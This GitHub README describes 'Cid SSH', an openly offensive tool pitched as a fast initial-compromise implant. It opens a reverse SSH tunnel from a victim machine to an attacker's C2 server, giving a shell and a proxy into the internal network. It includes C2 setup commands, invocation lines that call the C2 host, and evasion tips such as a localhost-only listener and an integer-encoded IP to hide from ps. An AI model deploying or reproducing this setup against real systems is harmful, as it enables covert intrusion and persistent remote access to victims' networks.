<p align="center">
  <img src="http://equestrianstatue.org/wp-content/uploads/2016/04/Spain-Burgos-El-Cid-4-525x394.jpg">
</p>

<p align="center">
  <a href="https://github.com/RedRangerz/Cid-SSH/actions?query=workflow%3A%22Build+for+Windows%22"><img alt="Build for Windows" src="https://github.com/RedRangerz/Cid-SSH/workflows/Build%20for%20Windows/badge.svg"></a>
  <a href="https://github.com/RedRangerz/Cid-SSH/actions?query=workflow%3A%22Build+for+macOS%22"><img alt="Build for macOS" src="https://github.com/RedRangerz/Cid-SSH/workflows/Build%20for%20macOS/badge.svg"></a>
  <a href="https://github.com/RedRangerz/Cid-SSH/actions?query=workflow%3A%22Build+for+Linux%22"><img alt="Build for Linux" src="https://github.com/RedRangerz/Cid-SSH/workflows/Build%20for%20Linux/badge.svg"></a>
</p>

# Cid SSH

Let's face it, there is no better shell than SSH. It just not only provides a rich encrypted shell communication but it can be used to create a socks proxy to browse the internal network of a system.

**CidSSH** is a statically compiled tool (no dependencies needed) that can be used to create an SSH server and a SSH client within just one binary. It will firstly, create RSA certificates, spin up an SSH server (listening in `localhost` and by default on port 2222),and finally create a reverse SSH tunnel with a C2 host specify by command lone. Due to the fact that the SSH server listens at `localhost`, external scanners won't detect it. 

This tool can be used as a fast initial compromise tool that can be used not only as a shell but also to browse the internal network of the victim. 

Windows systems lack of a proper TTY but thanks to [this](https://blogs.msdn.microsoft.com/commandline/2018/08/02/windows-command-line-introducing-the-windows-pseudo-console-conpty/) we can in recent Windows versions get a fully functional TTY. In the case that the target system does not support `CreatePseudoConsole` it will downgrade to a simple, not interactive shell.


## Setup instructions
### C2 server
We need to properly configure the SSH server running at the C2 so we don't get hacked.

Run all of these commands:

```
sudo useradd anonymous
echo anonymous:U6aMy0wojraho | sudo chpasswd -e
sudo usermod -s /bin/false anonymous # change /bin/false to /path/to/Cid-Controller to use Cid-Controller
```

Allow blank passwords for SSH sessions for the `anonymous` user and restrict `anonymous` user to allow only reverse port forwarding:

```
sudo cat <<EOT >> /etc/ssh/sshd_config
PermitEmptyPasswords yes
ClientAliveInterval 120
ClientAliveCountMax 3

Match User anonymous
   AllowTcpForwarding remote
   X11Forwarding no
   PermitTunnel no
   GatewayPorts no
   AllowAgentForwarding no
   AllowStreamLocalForwarding no
EOT
```

Restart sshd:
```sudo systemctl restart ssh```

### Prebuilt binaries
You can just use the prebuilt binaries that are in [Release](https://github.com/RedRangerz/Cid-SSH/releases). They are ready to roll.

If you want to compile from source keep reading below.

## Using it

Defaults: user is `anonymous`.

Syntaxis:

`Cid-SSH.exe [user@]C2_hostname`

Examples:
```
Cid-SSH.exe 192.168.15.135
Cid-SSH.exe user@192.168.15.135
Cid-SSH.exe -t 3232239495
```

You could also specify the IP address as an integer so it's not that obvious if `ps` is run:
```
Cid-SSH.exe -t 3232239495
```
[Page to do the conversion](http://www.aboutmyip.com/AboutMyXApp/IP2Integer.jsp).

## Compilation

You can find more info about compilation [here](COMPILATION.md).

## Authors
- Alberto Garcia Illera (alberto.garcia@getcruise.com)
- Francisco Oca (foca@getcruise.com)
- Bert JW Regeer (bert.regeer@getcruise.com)
